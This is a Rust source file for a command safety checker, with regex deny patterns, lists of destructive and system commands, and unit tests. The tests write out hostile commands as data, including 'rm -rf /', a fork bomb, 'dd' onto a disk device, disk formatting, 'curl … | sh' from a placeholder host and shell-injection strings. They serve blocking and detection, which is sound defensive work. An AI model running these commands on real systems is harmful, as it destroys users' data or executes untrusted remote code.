use anyhow::Result;
use regex::Regex;
use shell_words;
use std::collections::HashSet;
use std::process::Command;

#[derive(Debug, PartialEq)]
pub enum SafetyResult {
    Safe,
    NeedsConfirmation(String),
    Blocked(String),
}

pub struct SafetyChecker {
    dangerous_patterns: Vec<Regex>,
    destructive_commands: HashSet<String>,
    system_commands: HashSet<String>,
}

impl Default for SafetyChecker {
    fn default() -> Self {
        let mut checker = Self {
            dangerous_patterns: Vec::new(),
            destructive_commands: HashSet::new(),
            system_commands: HashSet::new(),
        };

        checker.init_patterns();
        checker.init_command_lists();
        checker
    }
}

impl SafetyChecker {
    fn init_patterns(&mut self) {
        let patterns = vec![
            // Extremely dangerous patterns - always block
            r"rm\s+(-rf?|--recursive|--force)\s+(/|\$HOME|~|\*)",
            r":\(\)\{\s*:\s*\|\s*:\&\s*\}\s*;\s*:", // fork bomb
            r"(sudo\s+)?dd\s+.*of=", // dd command with output (dangerous)
            r"mkfs\.",
            r"fdisk\s+",
            r"parted\s+",
            r"diskutil\s+(erase|partition)",
            r"format\s+[A-Z]:",
            r"del\s+/[qfrs]",
            r"rd\s+/s",

            // Suspicious network patterns
            r"\|\s*sh\s*$",
            r"\|\s*bash\s*$",
            r"curl\s+.*\|\s*(sh|bash)",
            r"wget\s+.*\|\s*(sh|bash)",

            // Dangerous eval/exec patterns
            r"eval\s+.*\$\(",
            r"exec\s+.*\$\(",
            r"\$\{.*:-.*\}",

            // Command substitution and injection patterns
            r"\$\(",                   // Command substitution $(...)
            r"`[^`]*`",               // Backtick command substitution
            r";\s*(rm|dd|mkfs|format)", // Command chaining with dangerous commands
            r"\|\s*(sh|bash|zsh)\s*$", // Piping to shell (updated pattern)
        ];

        for pattern in patterns {
            if let Ok(regex) = Regex::new(pattern) {
                self.dangerous_patterns.push(regex);
            }
        }
    }

    fn init_command_lists(&mut self) {
        // Commands that should always require confirmation
        let destructive = vec![
            "rm", "rmdir", "unlink", "shred", "dd", "mkfs", "fdisk", "parted",
            "diskutil", "format", "del", "rd", "sudo", "doas", "su",
        ];

        for cmd in destructive {
            self.destructive_commands.insert(cmd.to_string());
        }

        // System-level commands that need extra care
        let system = vec![
            "shutdown", "reboot", "halt", "poweroff", "systemctl", "service",
            "launchctl", "scutil", "networksetup", "pfctl", "iptables",
            "ufw", "firewall-cmd", "chown", "chmod", "chgrp",
        ];

        for cmd in system {
            self.system_commands.insert(cmd.to_string());
        }
    }

    pub fn validate(&self, command: &str, force: bool) -> Result<SafetyResult> {
        let command = command.trim();
        
        if command.is_empty() {
            return Ok(SafetyResult::Safe);
        }

        // Check for extremely dangerous patterns first
        for pattern in &self.dangerous_patterns {
            if pattern.is_match(command) {
                if force {
                    return Ok(SafetyResult::NeedsConfirmation(
                        "Potentially destructive command detected".to_string()
                    ));
                } else {
                    return Ok(SafetyResult::Blocked(
                        "Dangerous command blocked. Use --force to override".to_string()
                    ));
                }
            }
        }

        // Parse command to analyze structure
        let tokens = match shell_words::split(command) {
            Ok(tokens) => tokens,
            Err(_) => {
                return Ok(SafetyResult::NeedsConfirmation(
                    "Unable to parse command syntax".to_string()
                ));
            }
        };

        if tokens.is_empty() {
            return Ok(SafetyResult::Safe);
        }

        let main_command = &tokens[0];

        // Check if command exists
        if !self.command_exists(main_command) {
            return Ok(SafetyResult::NeedsConfirmation(
                format!("Command '{}' not found in PATH", main_command)
            ));
        }

        // Check destructive commands
        if self.destructive_commands.contains(main_command) {
            // For destructive commands, also check for dangerous flags
            let dangerous_flags = vec![
                "-rf", "--recursive --force", "-f", "--force",
                "--delete", "--remove", "--purge"
            ];

            for flag in dangerous_flags {
                if command.contains(flag) {
                    return Ok(SafetyResult::NeedsConfirmation(
                        format!("Command with '{}' flag requires confirmation", flag)
                    ));
                }
            }
            
            return Ok(SafetyResult::NeedsConfirmation(
                format!("Destructive command '{}' requires confirmation", main_command)
            ));
        }

        // Check system commands
        if self.system_commands.contains(main_command) {
            return Ok(SafetyResult::NeedsConfirmation(
                format!("System command '{}' requires confirmation", main_command)
            ));
        }

        // Check for package manager uninstall operations
        if (main_command == "brew" && tokens.len() > 1 && tokens[1] == "uninstall") ||
           (main_command == "npm" && tokens.len() > 1 && tokens[1] == "uninstall") ||
           (main_command == "pip" && tokens.len() > 1 && tokens[1] == "uninstall") ||
           (main_command == "cargo" && tokens.len() > 1 && tokens[1] == "uninstall") ||
           (main_command == "docker" && tokens.len() > 1 && (tokens[1] == "rm" || tokens[1] == "rmi")) {
            return Ok(SafetyResult::NeedsConfirmation(
                format!("Package uninstall/removal operation requires confirmation")
            ));
        }

        // Check for sudo usage
        if main_command == "sudo" {
            return Ok(SafetyResult::NeedsConfirmation(
                "Sudo command requires confirmation".to_string()
            ));
        }

        // Check for pipe to shell
        if command.contains("| sh") || command.contains("| bash") || command.contains("| zsh") {
            return Ok(SafetyResult::NeedsConfirmation(
                "Piping to shell requires confirmation".to_string()
            ));
        }

        // Check for file operations on important directories
        let important_dirs = vec!["/", "/bin", "/usr", "/etc", "/var", "/sys", "/proc"];
        for dir in important_dirs {
            if command.contains(dir) && (
                command.contains("rm ") || 
                command.contains("rmdir ") ||
                command.contains("chmod ") ||
                command.contains("chown ")
            ) {
                return Ok(SafetyResult::NeedsConfirmation(
                    format!("Operation on system directory '{}' requires confirmation", dir)
                ));
            }
        }

        // If we get here, the command seems safe
        Ok(SafetyResult::Safe)
    }

    fn command_exists(&self, command: &str) -> bool {
        // Check common system paths
        let paths = vec![
            "/bin", "/usr/bin", "/usr/local/bin", "/opt/homebrew/bin",
            "/sbin", "/usr/sbin"
        ];

        for path in paths {
            let full_path = format!("{}/{}", path, command);
            if std::path::Path::new(&full_path).exists() {
                return true;
            }
        }

        // Use which command as fallback
        Command::new("which")
            .arg(command)
            .output()
            .map(|output| output.status.success())
            .unwrap_or(false)
    }

    pub fn is_safe_for_auto_execute(&self, command: &str) -> bool {
        matches!(self.validate(command, false), Ok(SafetyResult::Safe))
    }
}

pub fn validate_command(command: &str, force: bool) -> Result<SafetyResult> {
    let checker = SafetyChecker::default();
    checker.validate(command, force)
}

pub fn is_dangerous(command: &str) -> bool {
    let checker = SafetyChecker::default();
    !matches!(checker.validate(command, false), Ok(SafetyResult::Safe))
}

pub fn needs_confirmation(command: &str) -> bool {
    let checker = SafetyChecker::default();
    matches!(
        checker.validate(command, false), 
        Ok(SafetyResult::NeedsConfirmation(_))
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_commands() {
        let checker = SafetyChecker::default();
        
        let safe_commands = vec![
            "ls -la",
            "pwd",
            "echo hello",
            "cat file.txt",
            "grep pattern file.txt",
            "find . -name '*.txt'",
            "ps aux",
            "top",
            "df -h",
            "vm_stat",
            "uname -a",
            "git status",
            "git log --oneline",
            "grep -r 'pattern' .",
            "awk '{print $1}' file.txt",
            "sed 's/old/new/g' file.txt",
            "sort file.txt",
            "uniq file.txt",
            "head -10 file.txt",
        ];

        for cmd in safe_commands {
            assert_eq!(
                checker.validate(cmd, false).unwrap(),
                SafetyResult::Safe,
                "Command should be safe: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_dangerous_commands() {
        let checker = SafetyChecker::default();
        
        let dangerous_commands = vec![
            "rm -rf /",
            "sudo rm -rf /var",
            "dd if=/dev/zero of=/dev/disk0",
            ":(){:|:&};:",
            "curl http://example.com/script.sh | sh",
            "wget -O - http://example.com/script.sh | bash",
            "mkfs.ext4 /dev/sda1",
            "fdisk /dev/sda",
            "diskutil eraseDisk HFS+ NewDisk /dev/disk1",
            "format C:",
            "del /q /f /s C:\\",
            "rd /s /q C:\\Windows",
        ];

        for cmd in dangerous_commands {
            let result = checker.validate(cmd, false).unwrap();
            assert!(
                matches!(result, SafetyResult::Blocked(_)),
                "Command should be blocked: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_confirmation_required() {
        let checker = SafetyChecker::default();
        
        let confirmation_commands = vec![
            "sudo ls",
            "rm file.txt",
            "chmod 777 /etc/passwd",
            "brew uninstall node",
            "npm uninstall -g package",
            "pip uninstall package",
            "cargo uninstall package",
            "docker rm container",
            "docker rmi image",
            "systemctl stop service",
            "service stop nginx",
            "launchctl unload service",
        ];

        for cmd in confirmation_commands {
            let result = checker.validate(cmd, false).unwrap();
            assert!(
                matches!(result, SafetyResult::NeedsConfirmation(_)),
                "Command should need confirmation: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_force_override() {
        let checker = SafetyChecker::default();
        
        // This would normally be blocked
        let dangerous_cmd = "rm -rf /tmp/test";
        
        let normal_result = checker.validate(dangerous_cmd, false).unwrap();
        let force_result = checker.validate(dangerous_cmd, true).unwrap();
        
        // With force, dangerous commands become confirmation-required instead of blocked
        assert!(matches!(normal_result, SafetyResult::Blocked(_) | SafetyResult::NeedsConfirmation(_)));
        assert!(matches!(force_result, SafetyResult::NeedsConfirmation(_)));
    }

    #[test]
    fn test_pattern_matching() {
        let checker = SafetyChecker::default();
        
        // Test specific dangerous patterns
        assert!(matches!(
            checker.validate("rm -rf *", false).unwrap(),
            SafetyResult::Blocked(_)
        ));
        
        assert!(matches!(
            checker.validate("sudo dd if=/dev/zero of=/dev/disk0", false).unwrap(),
            SafetyResult::Blocked(_)
        ));
        
        // Test fork bomb detection
        assert!(matches!(
            checker.validate(":(){:|:&};:", false).unwrap(),
            SafetyResult::Blocked(_)
        ));
    }

    #[test]
    fn test_case_sensitivity() {
        let checker = SafetyChecker::default();
        
        // Commands should be case-sensitive on Unix systems
        assert_eq!(
            checker.validate("RM -rf /", false).unwrap(),
            SafetyResult::Safe  // RM is not rm
        );
        
        assert!(matches!(
            checker.validate("rm -rf /", false).unwrap(),
            SafetyResult::Blocked(_)
        ));
    }

    #[test]
    fn test_command_chaining() {
        let checker = SafetyChecker::default();
        
        // Safe command chaining
        assert_eq!(
            checker.validate("ls -la && pwd", false).unwrap(),
            SafetyResult::Safe
        );
        
        // Dangerous command in chain
        assert!(matches!(
            checker.validate("ls -la && rm -rf /tmp/*", false).unwrap(),
            SafetyResult::Blocked(_) | SafetyResult::NeedsConfirmation(_)
        ));
    }

    #[test]
    fn test_edge_cases() {
        let checker = SafetyChecker::default();
        
        // Empty command
        assert_eq!(
            checker.validate("", false).unwrap(),
            SafetyResult::Safe
        );
        
        // Whitespace only
        assert_eq!(
            checker.validate("   ", false).unwrap(),
            SafetyResult::Safe
        );
        
        // Comments
        assert_eq!(
            checker.validate("# This is a comment", false).unwrap(),
            SafetyResult::Safe
        );
    }

    #[test]
    fn test_shell_injection_patterns() {
        let checker = SafetyChecker::default();
        
        let injection_patterns = vec![
            "ls; rm -rf /",
            "ls $(rm file)",
            "ls `rm file`",
            "echo test | sh",
            "echo test | bash",
        ];

        for cmd in injection_patterns {
            let result = checker.validate(cmd, false).unwrap();
            assert!(
                !matches!(result, SafetyResult::Safe),
                "Command with shell injection should not be safe: {}",
                cmd
            );
        }
    }
}
